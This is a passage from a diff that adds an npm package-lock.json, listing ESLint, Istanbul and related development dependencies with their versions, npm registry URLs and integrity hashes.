""https://registry.npmjs.org/esprima/-/esprima-2.7.3.tgz""<c><\n>+          ""integrity"": ""sha1-luO3DVd59q1JzQMmc9HDEnZ7pYE=""<c><\n>+          ""dev"": true<\n>+        }<c><\n>+        ""estraverse"": {<\n>+          ""version"": ""1.9.3""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/estraverse/-/estraverse-1.9.3.tgz""<c><\n>+          ""integrity"": ""sha1-r2fy3JIlgkFZUJJgkaQAXSnJu0Q=""<c><\n>+          ""dev"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""escope"": {<\n>+      ""version"": ""3.6.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/escope/-/escope-3.6.0.tgz""<c><\n>+      ""integrity"": ""sha1-4Bl16BJ4GhY6ba392AOY3GTIicM=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""es6-map"": ""0.1.5""<c><\n>+        ""es6-weak-map"": ""2.0.2""<c><\n>+        ""esrecurse"": ""4.2.1""<c><\n>+        ""estraverse"": ""4.2.0""<\n>+      }<\n>+    }<c><\n>+    ""eslint"": {<\n>+      ""version"": ""3.19.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/eslint/-/eslint-3.19.0.tgz""<c><\n>+      ""integrity"": ""sha1-yPxiAcf0DdCJQbh8CFdnOGpnmsw=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""babel-code-frame"": ""6.26.0""<c><\n>+        ""chalk"": ""1.1.3""<c><\n>+        ""concat-stream"": ""1.6.2""<c><\n>+        ""debug"": ""2.6.9""<c><\n>+        ""doctrine"": ""2.1.0""<c><\n>+        ""escope"": ""3.6.0""<c><\n>+        ""espree"": ""3.5.4""<c><\n>+        ""esquery"": ""1.0.1""<c><\n>+        ""estraverse"": ""4.2.0""<c><\n>+        ""esutils"": ""2.0.2""<c><\n>+        ""file-entry-cache"": ""2.0.0""<c><\n>+        ""glob"": ""7.1.2""<c><\n>+        ""globals"": ""9.18.0""<c><\n>+        ""ignore"": ""3.3.8""<c><\n>+        ""imurmurhash"": ""0.1.4""<c><\n>+        ""inquirer"": ""0.12.0""<c><\n>+        ""is-my-json-valid"": ""2.17.2""<c><\n>+        ""is-resolvable"": ""1.1.0""<c><\n>+        ""js-yaml"": ""3.11.0""<c><\n>+        ""json-stable-stringify"": ""1.0.1""<c><\n>+        ""levn"": ""0.3.0""<c><\n>+        ""lodash"": ""4.17.10""<c><\n>+        ""mkdirp"": ""0.5.1""<c><\n>+        ""natural-compare"": ""1.4.0""<c><\n>+        ""optionator"": ""0.8.2""<c><\n>+        ""path-is-inside"": ""1.0.2""<c><\n>+        ""pluralize"": ""1.2.1""<c><\n>+        ""progress"": ""1.1.8""<c><\n>+        ""require-uncached"": ""1.0.3""<c><\n>+        ""shelljs"": ""0.7.8""<c><\n>+        ""strip-bom"": ""3.0.0""<c><\n>+        ""strip-json-comments"": ""2.0.1""<c><\n>+        ""table"": ""3.8.3""<c><\n>+        ""text-table"": ""0.2.0""<c><\n>+        ""user-home"": ""2.0.0""<\n>+      }<\n>+    }<c><\n>+    ""eslint-config-eslint"": {<\n>+      ""version"": ""4.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/eslint-config-eslint/-/eslint-config-eslint-4.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-pGOpZiHkyKgOqR60wHh7ujoPe+s=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""js-yaml"": ""3.11.0""<\n>+      }<\n>+    }<c><\n>+    ""eslint-release"": {<\n>+      ""version"": ""0.11.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/eslint-release/-/eslint-release-0.11.1.tgz""<c><\n>+      ""integrity"": ""sha512-y3UVbkwicvB8jySfD2IZ9l6f5TDs6yq9OLC0FFMwySOdbMCkiHXfzNP5jbPQ4+FeMLKhJXX3IF9MsmW5KNlA9A==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""dateformat"": ""1.0.12""<c><\n>+        ""github-api"": ""2.3.0""<c><\n>+        ""linefix"": ""0.1.1""<c><\n>+        ""npm-license"": ""0.3.3""<c><\n>+        ""semver"": ""5.5.0""<c><\n>+        ""shelljs"": ""0.5.3""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""shelljs"": {<\n>+          ""version"": ""0.5.3""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/shelljs/-/shelljs-0.5.3.tgz""<c><\n>+          ""integrity"": ""sha1-xUmCuZbHbvDB5rWfvcWCX1txMRM=""<c><\n>+          ""dev"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""espree"": {<\n>+      ""version"": ""3.5.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/espree/-/espree-3.5.4.tgz""<c><\n>+      ""integrity"": ""sha512-yAcIQxtmMiB/jL32dzEp2enBeidsB7xWPLNiw3IIkpVds1P+h7qF9YwJq1yUNzp2OKXgAprs4F61ih66UsoD1A==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""acorn"": ""5.5.3""<c><\n>+        ""acorn-jsx"": ""3.0.1""<\n>+      }<\n>+    }<c><\n>+    ""esprima"": {<\n>+      ""version"": ""4.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/esprima/-/esprima-4.0.0.tgz""<c><\n>+      ""integrity"": ""sha512-oftTcaMu/EGrEIu904mWteKIv8vMuOgGYo7EhVJJN00R/EED9DCua/xxHRdYnKtcECzVg7xOWhflvJMnqcFZjw==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""esquery"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/esquery/-/esquery-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha512-SmiyZ5zIWH9VM+SRUReLS5Q8a7GxtRdxEBVZpm98rJM7Sb+A9DVCndXfkeFUd3byderg+EbDkfnevfCwynWaNA==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""estraverse"": ""4.2.0""<\n>+      }<\n>+    }<c><\n>+    ""esrecurse"": {<\n>+      ""version"": ""4.2.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/esrecurse/-/esrecurse-4.2.1.tgz""<c><\n>+      ""integrity"": ""sha512-64RBB++fIOAXPw3P9cy89qfMlvZEXZkqqJkjqqXIvzP5ezRZjW+lPWjw35UX/3EhUPFYbg5ER4JYgDw4007/DQ==""<c><\n>+      ""requires"": {<\n>+        ""estraverse"": ""4.2.0""<\n>+      }<\n>+    }<c><\n>+    ""estraverse"": {<\n>+      ""version"": ""4.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/estraverse/-/estraverse-4.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-De4/7TH81GlhjOc0IJn8GvoL2xM=""<\n>+    }<c><\n>+    ""esutils"": {<\n>+      ""version"": ""2.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/esutils/-/esutils-2.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-Cr9PHKpbyx96nYrMbepPqqBLrJs=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""event-emitter"": {<\n>+      ""version"": ""0.3.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/event-emitter/-/event-emitter-0.3.5.tgz""<c><\n>+      ""integrity"": ""sha1-34xp7vFkeSPHFXuc6DhAYQsCzDk=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""d"": ""1.0.0""<c><\n>+        ""es5-ext"": ""0.10.42""<\n>+      }<\n>+    }<c><\n>+    ""exit-hook"": {<\n>+      ""version"": ""1.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/exit-hook/-/exit-hook-1.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-8FyiM7SMBdVP/wd2XfhQfpXAL/g=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""fast-levenshtein"": {<\n>+      ""version"": ""2.0.6""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/fast-levenshtein/-/fast-levenshtein-2.0.6.tgz""<c><\n>+      ""integrity"": ""sha1-PYpcZog6FqMMqGQ+hR8Zuqd5eRc=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""figures"": {<\n>+      ""version"": ""1.7.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/figures/-/figures-1.7.0.tgz""<c><\n>+      ""integrity"": ""sha1-y+Hjr/zxzUS4DK3+0o3Hk6lwHS4=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""escape-string-regexp"": ""1.0.5""<c><\n>+        ""object-assign"": ""4.1.1""<\n>+      }<\n>+    }<c><\n>+    ""file-entry-cache"": {<\n>+      ""version"": ""2.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/file-entry-cache/-/file-entry-cache-2.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-w5KZDD5oR4PYOLjISkXYoEhFg2E=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""flat-cache"": ""1.3.0""<c><\n>+        ""object-assign"": ""4.1.1""<\n>+      }<\n>+    }<c><\n>+    ""find-up"": {<\n>+      ""version"": ""1.1.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/find-up/-/find-up-1.1.2.tgz""<c><\n>+      ""integrity"": ""sha1-ay6YIrGizgpgq2TWEOzK1TyyTQ8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""path-exists"": ""2.1.0""<c><\n>+        ""pinkie-promise"": ""2.0.1""<\n>+      }<\n>+    }<c><\n>+    ""flat-cache"": {<\n>+      ""version"": ""1.3.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/flat-cache/-/flat-cache-1.3.0.tgz""<c><\n>+      ""integrity"": ""sha1-0wMLMrOBVPTjt+nHCfSQ9++XxIE=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""circular-json"": ""0.3.3""<c><\n>+        ""del"": ""2.2.2""<c><\n>+        ""graceful-fs"": ""4.1.11""<c><\n>+        ""write"": ""0.2.1""<\n>+      }<\n>+    }<c><\n>+    ""follow-redirects"": {<\n>+      ""version"": ""0.0.7""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/follow-redirects/-/follow-redirects-0.0.7.tgz""<c><\n>+      ""integrity"": ""sha1-NLkLqyqRGqNHVx2pDyK9NuzYqRk=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""debug"": ""2.6.9""<c><\n>+        ""stream-consume"": ""0.1.1""<\n>+      }<\n>+    }<c><\n>+    ""fs.realpath"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/fs.realpath/-/fs.realpath-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-FQStJSMVjKpA20onh8sBQRmU6k8=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""generate-function"": {<\n>+      ""version"": ""2.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/generate-function/-/generate-function-2.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-aFj+fAlpt9TpCTM3ZHrHn2DfvnQ=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""generate-object-property"": {<\n>+      ""version"": ""1.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/generate-object-property/-/generate-object-property-1.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-nA4cQDCM6AT0eDYYuTf6iPmdUNA=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""is-property"": ""1.0.2""<\n>+      }<\n>+    }<c><\n>+    ""get-stdin"": {<\n>+      ""version"": ""4.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/get-stdin/-/get-stdin-4.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-uWjGsKBDhDJJAui/Gl3zJXmkUP4=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""github-api"": {<\n>+      ""version"": ""2.3.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/github-api/-/github-api-2.3.0.tgz""<c><\n>+      ""integrity"": ""sha1-7udoRgsp6G6RuWqeefhVXO9rUyU=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""axios"": ""0.10.0""<c><\n>+        ""debug"": ""2.6.9""<c><\n>+        ""es6-promise"": ""3.3.1""<c><\n>+        ""js-base64"": ""2.4.3""<c><\n>+        ""utf8"": ""2.1.2""<\n>+      }<\n>+    }<c><\n>+    ""glob"": {<\n>+      ""version"": ""7.1.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/glob/-/glob-7.1.2.tgz""<c><\n>+      ""integrity"": ""sha512-MJTUg1kjuLeQCJ+ccE4Vpa6kKVXkPYJ2mOCQyUuKLcLQsdrMCpBPUi8qVE6+YuaJkozeA9NusTAw3hLr8Xe5EQ==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""fs.realpath"": ""1.0.0""<c><\n>+        ""inflight"": ""1.0.6""<c><\n>+        ""inherits"": ""2.0.3""<c><\n>+        ""minimatch"": ""3.0.4""<c><\n>+        ""once"": ""1.4.0""<c><\n>+        ""path-is-absolute"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""globals"": {<\n>+      ""version"": ""9.18.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/globals/-/globals-9.18.0.tgz""<c><\n>+      ""integrity"": ""sha512-S0nG3CLEQiY/ILxqtztTWH/3iRRdyBLw6KMDxnKMchrtbj2OFmehVh0WUCfW3DUrIgx/qFrJPICrq4Z4sTR9UQ==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""globby"": {<\n>+      ""version"": ""5.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/globby/-/globby-5.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-69hGZ8oNuzMLmbz8aOrCvFQ3Dg0=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""array-union"": ""1.0.2""<c><\n>+        ""arrify"": ""1.0.1""<c><\n>+        ""glob"": ""7.1.2""<c><\n>+        ""object-assign"": ""4.1.1""<c><\n>+        ""pify"": ""2.3.0""<c><\n>+        ""pinkie-promise"": ""2.0.1""<\n>+      }<\n>+    }<c><\n>+    ""graceful-fs"": {<\n>+      ""version"": ""4.1.11""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/graceful-fs/-/graceful-fs-4.1.11.tgz""<c><\n>+      ""integrity"": ""sha1-Dovf5NHduIVNZOBOp8AOKgJuVlg=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""graceful-readlink"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/graceful-readlink/-/graceful-readlink-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-TK+tdrxi8C+gObL5Tpo906ORpyU=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""growl"": {<\n>+      ""version"": ""1.9.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/growl/-/growl-1.9.2.tgz""<c><\n>+      ""integrity"": ""sha1-Dqd0NxXbjY3ixe3hd14bRayFwC8=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""handlebars"": {<\n>+      ""version"": ""4.0.11""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/handlebars/-/handlebars-4.0.11.tgz""<c><\n>+      ""integrity"": ""sha1-Ywo13+ApS8KB7a5v/F0yn8eYLcw=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""async"": ""1.5.2""<c><\n>+        ""optimist"": ""0.6.1""<c><\n>+        ""source-map"": ""0.4.4""<c><\n>+        ""uglify-js"": ""2.8.29""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""source-map"": {<\n>+          ""version"": ""0.4.4""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/source-map/-/source-map-0.4.4.tgz""<c><\n>+          ""integrity"": ""sha1-66T12pwNyZneaAMti092FzZSA2s=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""amdefine"": ""1.0.1""<\n>+          }<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""has-ansi"": {<\n>+      ""version"": ""2.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/has-ansi/-/has-ansi-2.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-NPUEnOHs3ysGSa8+8k5F7TVBbZE=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""ansi-regex"": ""2.1.1""<\n>+      }<\n>+    }<c><\n>+    ""has-flag"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/has-flag/-/has-flag-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-nZ55MWXOAXoA8AQYxD+UKnsdEfo=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""he"": {<\n>+      ""version"": ""1.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/he/-/he-1.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-k0EP0hsAlzUVH4howvJx80J+I/0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""hosted-git-info"": {<\n>+      ""version"": ""2.6.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/hosted-git-info/-/hosted-git-info-2.6.0.tgz""<c><\n>+      ""integrity"": ""sha512-lIbgIIQA3lz5XaB6vxakj6sDHADJiZadYEJB+FgA+C4nubM1NwcuvUr9EJPmnH1skZqpqUzWborWo8EIUi0Sdw==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""ignore"": {<\n>+      ""version"": ""3.3.8""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ignore/-/ignore-3.3.8.tgz""<c><\n>+      ""integrity"": ""sha512-pUh+xUQQhQzevjRHHFqqcTy0/dP/kS9I8HSrUydhihjuD09W6ldVWFtIrwhXdUJHis3i2rZNqEHpZH/cbinFbg==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""imurmurhash"": {<\n>+      ""version"": ""0.1.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/imurmurhash/-/imurmurhash-0.1.4.tgz""<c><\n>+      ""integrity"": ""sha1-khi5srkoojixPcT7a21XbyMUU+o=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""indent-string"": {<\n>+      ""version"": ""2.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/indent-string/-/indent-string-2.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-ji1INIdCEhtKghi3oTfppSBJ3IA=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""repeating"": ""2.0.1""<\n>+      }<\n>+    }<c><\n>+    ""inflight"": {<\n>+      ""version"": ""1.0.6""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/inflight/-/inflight-1.0.6.tgz""<c><\n>+      ""integrity"": ""sha1-Sb1jMdfQLQwJvJEKEHW6gWW1bfk=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""once"": ""1.4.0""<c><\n>+        ""wrappy"": ""1.0.2""<\n>+      }<\n>+    }<c><\n>+    ""inherits"": {<\n>+      ""version"": ""2.0.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/inherits/-/inherits-2.0.3.tgz""<c><\n>+      ""integrity"": ""sha1-Yzwsg+PaQqUC9SRmAiSA9CCCYd4=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""inquirer"": {<\n>+      ""version"": ""0.12.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/inquirer/-/inquirer-0.12.0.tgz""<c><\n>+      ""integrity"": ""sha1-HvK/1jUE3wvHV4X/+MLEHfEvB34=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""ansi-escapes"": ""1.4.0""<c><\n>+        ""ansi-regex"": ""2.1.1""<c><\n>+        ""chalk"": ""1.1.3""<c><\n>+        ""cli-cursor"": ""1.0.2""<c><\n>+        ""cli-width"": ""2.2.0""<c><\n>+        ""figures"": ""1.7.0""<c><\n>+        ""lodash"": ""4.17.10""<c><\n>+        ""readline2"": ""1.0.1""<c><\n>+        ""run-async"": ""0.1.0""<c><\n>+        ""rx-lite"": ""3.1.2""<c><\n>+        ""string-width"": ""1.0.2""<c><\n>+        ""strip-ansi"": ""3.0.1""<c><\n>+        ""through"": ""2.3.8""<\n>+      }<\n>+    }<c><\n>+    ""interpret"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/interpret/-/interpret-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-ftGxQQxqDg94z5XTuEQMY/eLhhQ=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-arrayish"": {<\n>+      ""version"": ""0.2.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-arrayish/-/is-arrayish-0.2.1.tgz""<c><\n>+      ""integrity"": ""sha1-d8mYQFJ6qOyxqLppe4BkWnqSap0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-buffer"": {<\n>+      ""version"": ""1.1.6""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-buffer/-/is-buffer-1.1.6.tgz""<c><\n>+      ""integrity"": ""sha512-NcdALwpXkTm5Zvvbk7owOUSvVvBKDgKP5/ewfXEznmQFfs4ZRmanOeKBTjRVjka3QFoN6XJ+9F3USqfHqTaU5w==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-builtin-module"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-builtin-module/-/is-builtin-module-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-VAVy0096wxGfj3bDDLwbHgN6/74=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""builtin-modules"": ""1.1.1""<\n>+      }<\n>+    }<c><\n>+    ""is-finite"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-finite/-/is-finite-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-zGZ3aVYCvlUO8R6LSqYwU0K20Ko=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""number-is-nan"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""is-fullwidth-code-point"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-fullwidth-code-point/-/is-fullwidth-code-point-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-754xOG8DGn8NZDr4L95QxFfvAMs=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""number-is-nan"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""is-my-ip-valid"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-my-ip-valid/-/is-my-ip-valid-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha512-gmh/eWXROncUzRnIa1Ubrt5b8ep/MGSnfAUI3aRp+sqTCs1tv1Isl8d8F6JmkN3dXKc3ehZMrtiPN9eL03NuaQ==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-my-json-valid"": {<\n>+      ""version"": ""2.17.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-my-json-valid/-/is-my-json-valid-2.17.2.tgz""<c><\n>+      ""integrity"": ""sha512-IBhBslgngMQN8DDSppmgDv7RNrlFotuuDsKcrCP3+HbFaVivIBU7u9oiiErw8sH4ynx3+gOGQ3q2otkgiSi6kg==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""generate-function"": ""2.0.0""<c><\n>+        ""generate-object-property"": ""1.2.0""<c><\n>+        ""is-my-ip-valid"": ""1.0.0""<c><\n>+        ""jsonpointer"": ""4.0.1""<c><\n>+        ""xtend"": ""4.0.1""<\n>+      }<\n>+    }<c><\n>+    ""is-path-cwd"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-path-cwd/-/is-path-cwd-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-0iXsIxMuie3Tj9p2dHLmLmXxEG0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-path-in-cwd"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-path-in-cwd/-/is-path-in-cwd-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha512-FjV1RTW48E7CWM7eE/J2NJvAEEVektecDBVBE5Hh3nM1Jd0kvhHtX68Pr3xsDf857xt3Y4AkwVULK1Vku62aaQ==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""is-path-inside"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""is-path-inside"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-path-inside/-/is-path-inside-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-jvW33lBDej/cprToZe96pVy0gDY=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""path-is-inside"": ""1.0.2""<\n>+      }<\n>+    }<c><\n>+    ""is-property"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-property/-/is-property-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-V/4cTkhHTt1lsJkR8msc1Ald2oQ=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-resolvable"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-resolvable/-/is-resolvable-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha512-qgDYXFSR5WvEfuS5dMj6oTMEbrrSaM0CrFk2Yiq/gXnBvD9pMa2jGXxyhGLfvhZpuMZe18CJpFxAt3CRs42NMg==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""is-utf8"": {<\n>+      ""version"": ""0.2.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/is-utf8/-/is-utf8-0.2.1.tgz""<c><\n>+      ""integrity"": ""sha1-Sw2hRCEE0bM2NA6AeX6GXPOffXI=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""isarray"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/isarray/-/isarray-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-u5NdSFgsuhaMBoNJV6VKPgcSTxE=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""isexe"": {<\n>+      ""version"": ""2.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/isexe/-/isexe-2.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-6PvzdNxVb/iUehDcsFctYz8s+hA=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""istanbul"": {<\n>+      ""version"": ""0.4.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/istanbul/-/istanbul-0.4.5.tgz""<c><\n>+      ""integrity"": ""sha1-ZcfXPUxNqE1POsMQuRj7C4Azczs=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""abbrev"": ""1.0.9""<c><\n>+        ""async"": ""1.5.2""<c><\n>+        ""escodegen"": ""1.8.1""<c><\n>+        ""esprima"": ""2.7.3""<c><\n>+        ""glob"": ""5.0.15""<c><\n>+        ""handlebars"": ""4.0.11""<c><\n>+        ""js-yaml"": ""3.11.0""<c><\n>+        ""mkdirp"": ""0.5.1""<c><\n>+        ""nopt"": ""3.0.6""<c><\n>+        ""once"": ""1.4.0""<c><\n>+        ""resolve"": ""1.1.7""<c><\n>+        ""supports-color"": ""3.2.3""<c><\n>+        ""which"": ""1.3.0""<c><\n>+        ""wordwrap"": ""1.0.0""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""abbrev"": {<\n>+          ""version"": ""1.0.9""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/abbrev/-/abbrev-1.0.9.tgz""<c><\n>+          ""integrity"": ""sha1-kbR5JYinc4wl813W9jdSovh3YTU=""<c><\n>+          ""dev"": true<\n>+        }<c><\n>+        ""esprima"": {<\n>+          ""version"": ""2.7.3""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/esprima/-/esprima-2.7.3.tgz""<c><\n>+          ""integrity"": ""sha1-luO3DVd59q1JzQMmc9HDEnZ7pYE=""<c><\n>+          ""dev"": true<\n>+        }<c><\n>+        ""glob"": {<\n>+          ""version"": ""5.0.15""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/glob/-/glob-5.0.15.tgz""<c><\n>+          ""integrity"": ""sha1-G8k2ueAvSmA/zCIuz3Yz0wuLk7E=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""inflight"": ""1.0.6""<c><\n>+            ""inherits"": ""2.0.3""<c><\n>+            ""minimatch"": ""3.0.4""<c><\n>+            ""once"": ""1.4.0""<c><\n>+            ""path-is-absolute"": ""1.0.1""<\n>+          }<\n>+        }<c><\n>+        ""resolve"": {<\n>+          ""version"": ""1.1.7""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/resolve/-/resolve-1.1.7.tgz""<c><\n>+          ""integrity"": ""sha1-IDEU2CrSxe2ejgQRs5ModeiJ6Xs=""<c><\n>+          ""dev"": true<\n>+        }<c><\n>+        ""supports-color"": {<\n>+          ""version"": 